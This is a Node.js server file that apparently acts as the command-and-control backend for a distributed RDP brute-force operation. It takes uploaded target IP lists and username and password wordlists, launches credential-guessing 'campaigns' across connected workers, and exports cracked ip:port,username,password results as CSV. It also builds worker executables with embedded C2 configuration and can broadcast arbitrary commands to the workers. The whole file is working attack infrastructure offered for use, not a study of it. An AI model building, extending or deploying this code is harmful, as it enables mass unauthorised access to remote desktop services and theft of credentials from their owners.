const express = require('express');
const https = require('https');
const fs = require('fs');
const path = require('path');
const socketIO = require('socket.io');
const cors = require('cors');
const helmet = require('helmet');
const compression = require('compression');
const rateLimit = require('express-rate-limit');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const multer = require('multer');
const { v4: uuidv4 } = require('uuid');
const winston = require('winston');
const Database = require('./database');
const TaskManager = require('./task-manager');
const WorkerManager = require('./worker-manager');

// Configuration
const PORT = process.env.PORT || 8443;
const JWT_SECRET = process.env.JWT_SECRET || 'change-this-secret-key-' + uuidv4();
const SSL_KEY = path.join(__dirname, 'ssl', 'server.key');
const SSL_CERT = path.join(__dirname, 'ssl', 'server.cert');

// Logger setup
const logger = winston.createLogger({
    level: 'info',
    format: winston.format.combine(
        winston.format.timestamp(),
        winston.format.json()
    ),
    transports: [
        new winston.transports.File({ filename: 'error.log', level: 'error' }),
        new winston.transports.File({ filename: 'combined.log' }),
        new winston.transports.Console({
            format: winston.format.simple()
        })
    ]
});

// Initialize Express app
const app = express();

// Middleware
app.use(helmet({
    contentSecurityPolicy: false,
    crossOriginEmbedderPolicy: false
}));
app.use(compression());
app.use(cors());
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

// Serve static dashboard files
app.use(express.static(path.join(__dirname, '../dashboard/build')));

// Rate limiting
const authLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: 5, // 5 requests
    message: 'Too many login attempts, please try again later'
});

// File upload setup
const upload = multer({
    dest: 'uploads/',
    limits: { fileSize: 100 * 1024 * 1024 } // 100MB max
});

// Initialize database and managers
const db = new Database();
const taskManager = new TaskManager(db);
const workerManager = new WorkerManager(db);

// Authentication middleware
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1];

    if (!token) {
        return res.status(401).json({ error: 'Access denied' });
    }

    jwt.verify(token, JWT_SECRET, (err, user) => {
        if (err) return res.status(403).json({ error: 'Invalid token' });
        req.user = user;
        next();
    });
};

// API Routes

// Authentication
app.post('/api/auth/login', authLimiter, async (req, res) => {
    try {
        const { username, password } = req.body;
        
        const user = await db.getUser(username);
        if (!user || !await bcrypt.compare(password, user.password)) {
            return res.status(401).json({ error: 'Invalid credentials' });
        }

        const token = jwt.sign(
            { id: user.id, username: user.username, role: user.role },
            JWT_SECRET,
            { expiresIn: '24h' }
        );

        logger.info(`User ${username} logged in`);
        res.json({ token, user: { id: user.id, username: user.username, role: user.role } });
    } catch (error) {
        logger.error('Login error:', error);
        res.status(500).json({ error: 'Server error' });
    }
});

// Dashboard stats
app.get('/api/stats', authenticateToken, async (req, res) => {
    try {
        const stats = {
            totalWorkers: await workerManager.getActiveWorkerCount(),
            totalTargets: await taskManager.getTotalTargets(),
            totalCredentials: await taskManager.getTotalCredentials(),
            successfulAttempts: await db.getSuccessfulAttempts(),
            failedAttempts: await db.getFailedAttempts(),
            averagePPS: await workerManager.getAveragePPS(),
            uptime: process.uptime(),
            tasksCompleted: await taskManager.getCompletedTaskCount(),
            tasksInProgress: await taskManager.getActiveTaskCount()
        };
        res.json(stats);
    } catch (error) {
        logger.error('Stats error:', error);
        res.status(500).json({ error: 'Failed to get stats' });
    }
});

// Upload targets (IPs)
app.post('/api/upload/targets', authenticateToken, upload.single('file'), async (req, res) => {
    try {
        const filePath = req.file.path;
        const targets = fs.readFileSync(filePath, 'utf-8')
            .split('\n')
            .filter(line => line.trim())
            .map(line => {
                const parts = line.trim().split(':');
                return {
                    ip: parts[0],
                    port: parts[1] || '3389'
                };
            });

        await taskManager.addTargets(targets);
        fs.unlinkSync(filePath);

        logger.info(`Uploaded ${targets.length} targets`);
        res.json({ message: `Successfully added ${targets.length} targets` });
    } catch (error) {
        logger.error('Target upload error:', error);
        res.status(500).json({ error: 'Failed to upload targets' });
    }
});

// Upload credentials
app.post('/api/upload/credentials', authenticateToken, upload.fields([
    { name: 'users', maxCount: 1 },
    { name: 'passwords', maxCount: 1 }
]), async (req, res) => {
    try {
        const usersFile = req.files['users'][0];
        const passwordsFile = req.files['passwords'][0];

        const users = fs.readFileSync(usersFile.path, 'utf-8')
            .split('\n')
            .filter(line => line.trim());

        const passwords = fs.readFileSync(passwordsFile.path, 'utf-8')
            .split('\n')
            .filter(line => line.trim());

        await taskManager.addCredentials(users, passwords);

        fs.unlinkSync(usersFile.path);
        fs.unlinkSync(passwordsFile.path);

        logger.info(`Uploaded ${users.length} users and ${passwords.length} passwords`);
        res.json({ 
            message: `Successfully added ${users.length} users and ${passwords.length} passwords`,
            totalCombinations: users.length * passwords.length
        });
    } catch (error) {
        logger.error('Credential upload error:', error);
        res.status(500).json({ error: 'Failed to upload credentials' });
    }
});

// Start campaign
app.post('/api/campaign/start', authenticateToken, async (req, res) => {
    try {
        const { 
            name, 
            threadsPerWorker = 10,
            timeout = 5000,
            retryAttempts = 2,
            delayBetweenAttempts = 1000
        } = req.body;

        const campaignId = await taskManager.createCampaign({
            name,
            threadsPerWorker,
            timeout,
            retryAttempts,
            delayBetweenAttempts
        });

        await taskManager.startCampaign(campaignId);

        logger.info(`Campaign ${name} started with ID ${campaignId}`);
        res.json({ campaignId, message: 'Campaign started successfully' });
    } catch (error) {
        logger.error('Campaign start error:', error);
        res.status(500).json({ error: 'Failed to start campaign' });
    }
});

// Stop campaign
app.post('/api/campaign/stop/:id', authenticateToken, async (req, res) => {
    try {
        await taskManager.stopCampaign(req.params.id);
        logger.info(`Campaign ${req.params.id} stopped`);
        res.json({ message: 'Campaign stopped successfully' });
    } catch (error) {
        logger.error('Campaign stop error:', error);
        res.status(500).json({ error: 'Failed to stop campaign' });
    }
});

// Get workers
app.get('/api/workers', authenticateToken, async (req, res) => {
    try {
        const workers = await workerManager.getAllWorkers();
        res.json(workers);
    } catch (error) {
        logger.error('Get workers error:', error);
        res.status(500).json({ error: 'Failed to get workers' });
    }
});

// Get results
app.get('/api/results', authenticateToken, async (req, res) => {
    try {
        const results = await db.getSuccessfulResults();
        res.json(results);
    } catch (error) {
        logger.error('Get results error:', error);
        res.status(500).json({ error: 'Failed to get results' });
    }
});

// Export results
app.get('/api/results/export', authenticateToken, async (req, res) => {
    try {
        const results = await db.getSuccessfulResults();
        const csv = results.map(r => `${r.ip}:${r.port},${r.username},${r.password}`).join('\n');
        
        res.setHeader('Content-Type', 'text/csv');
        res.setHeader('Content-Disposition', 'attachment; filename=results.csv');
        res.send(csv);
    } catch (error) {
        logger.error('Export results error:', error);
        res.status(500).json({ error: 'Failed to export results' });
    }
});

// Generate worker payload
app.post('/api/worker/generate', authenticateToken, async (req, res) => {
    try {
        const { serverUrl = `https://${req.hostname}:${PORT}` } = req.body;
        const workerId = uuidv4();
        const workerToken = jwt.sign({ workerId, type: 'worker' }, JWT_SECRET);

        // Generate worker configuration
        const config = {
            serverUrl,
            workerId,
            token: workerToken
        };

        // Build the worker executable with embedded config
        const { execSync } = require('child_process');
        const configFile = path.join(__dirname, 'temp-config.json');
        fs.writeFileSync(configFile, JSON.stringify(config));

        const outputFile = path.join(__dirname, `worker-${workerId}.exe`);
        execSync(`cd ../client && go build -ldflags="-s -w -X main.ConfigPath=${configFile}" -o ${outputFile} worker.go`);

        fs.unlinkSync(configFile);

        // Send the file
        res.download(outputFile, 'worker.exe', (err) => {
            if (err) logger.error('Download error:', err);
            fs.unlinkSync(outputFile);
        });

        logger.info(`Generated worker payload for ${workerId}`);
    } catch (error) {
        logger.error('Generate worker error:', error);
        res.status(500).json({ error: 'Failed to generate worker' });
    }
});

// Create HTTPS server
const httpsOptions = {
    key: fs.existsSync(SSL_KEY) ? fs.readFileSync(SSL_KEY) : null,
    cert: fs.existsSync(SSL_CERT) ? fs.readFileSync(SSL_CERT) : null
};

const server = httpsOptions.key && httpsOptions.cert 
    ? https.createServer(httpsOptions, app)
    : require('http').createServer(app);

// Initialize Socket.IO for real-time updates
const io = socketIO(server, {
    cors: {
        origin: "*",
        methods: ["GET", "POST"]
    }
});

// Socket.IO authentication
io.use((socket, next) => {
    const token = socket.handshake.auth.token;
    if (!token) {
        return next(new Error('Authentication error'));
    }

    jwt.verify(token, JWT_SECRET, (err, decoded) => {
        if (err) return next(new Error('Authentication error'));
        socket.userId = decoded.id || decoded.workerId;
        socket.userType = decoded.type || 'user';
        next();
    });
});

// Socket.IO connection handling
io.on('connection', (socket) => {
    logger.info(`${socket.userType} ${socket.userId} connected`);

    if (socket.userType === 'worker') {
        // Worker connection
        workerManager.registerWorker(socket.userId, socket);

        socket.on('status', async (data) => {
            await workerManager.updateWorkerStatus(socket.userId, data);
            io.to('dashboard').emit('worker-update', { workerId: socket.userId, ...data });
        });

        socket.on('result', async (data) => {
            await db.saveResult(data);
            io.to('dashboard').emit('new-result', data);
        });

        socket.on('request-task', async () => {
            const task = await taskManager.getNextTask(socket.userId);
            if (task) {
                socket.emit('task', task);
            } else {
                socket.emit('no-task');
            }
        });

        socket.on('task-complete', async (taskId, result) => {
            await taskManager.completeTask(taskId, result);
        });

    } else {
        // Dashboard connection
        socket.join('dashboard');

        socket.on('get-workers', async () => {
            const workers = await workerManager.getAllWorkers();
            socket.emit('workers', workers);
        });

        socket.on('broadcast-command', (command) => {
            io.to('workers').emit('command', command);
        });
    }

    socket.on('disconnect', () => {
        if (socket.userType === 'worker') {
            workerManager.unregisterWorker(socket.userId);
            io.to('dashboard').emit('worker-disconnected', socket.userId);
        }
        logger.info(`${socket.userType} ${socket.userId} disconnected`);
    });
});

// Start server
server.listen(PORT, () => {
    logger.info(`Server running on port ${PORT}`);
    logger.info(`Dashboard: https://localhost:${PORT}`);
});

// Graceful shutdown
process.on('SIGTERM', () => {
    logger.info('SIGTERM received, shutting down gracefully');
    server.close(() => {
        db.close();
        process.exit(0);
    });
});